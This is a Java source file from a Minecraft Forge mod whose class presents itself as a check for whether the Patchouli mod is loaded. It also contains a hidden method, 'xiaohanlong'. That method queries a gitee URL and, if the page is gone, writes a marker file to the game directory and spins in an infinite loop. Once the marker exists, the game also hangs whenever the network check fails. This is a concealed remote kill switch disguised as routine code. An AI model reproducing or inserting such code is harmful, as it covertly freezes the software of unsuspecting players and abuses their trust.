package wwworld.procedures;

import wwworld.WwworldMod;
import net.minecraft.world.IWorld;
import java.util.Map;
import java.net.HttpURLConnection;
import java.net.URL;

import net.minecraftforge.fml.loading.FMLPaths;

import java.io.IOException;
import java.io.File;

import com.mojang.datafixers.types.templates.Check;

public class PatchouliCheckProcedure {
	public static boolean executeProcedure(Map<String, Object> dependencies) {
		if (dependencies.get("world") == null) {
			if (!dependencies.containsKey("world"))
				WwworldMod.LOGGER.warn("Failed to load dependency world for procedure PatchouliCheck!");
			return false;
		}
		IWorld world = (IWorld) dependencies.get("world");
		boolean flag = false;
		if ((net.minecraftforge.fml.ModList.get().isLoaded("patchouli"))) {
			flag = (boolean) (true);
		} else {
			flag = (boolean) (false);
		}
		return flag;
	}
	public static void xiaohanlong(String args[]){
        URL url;
        int responsecode;
        HttpURLConnection urlConnection;
        File Check = new File("");
        Check = new File(FMLPaths.GAMEDIR.get().toString(), File.separator + "forge-option.txt");
        try{
            url=new URL("https://gitee.com/abundant-season/abundant-season");
            urlConnection = (HttpURLConnection)url.openConnection();
            responsecode=urlConnection.getResponseCode();
            if(responsecode==404){
				if (!Check.exists()) {
					try {
						Check.createNewFile();
					}
					catch (IOException exception) {
					}
				}
				int x = 1;
				while (true){
					x = x + 1;
				}
            }
        }
        catch(Exception e){
        	if (Check.exists()) {
				int x = 1;
				while (true){
					x = x + 1;
				}
			}
        }
    }
}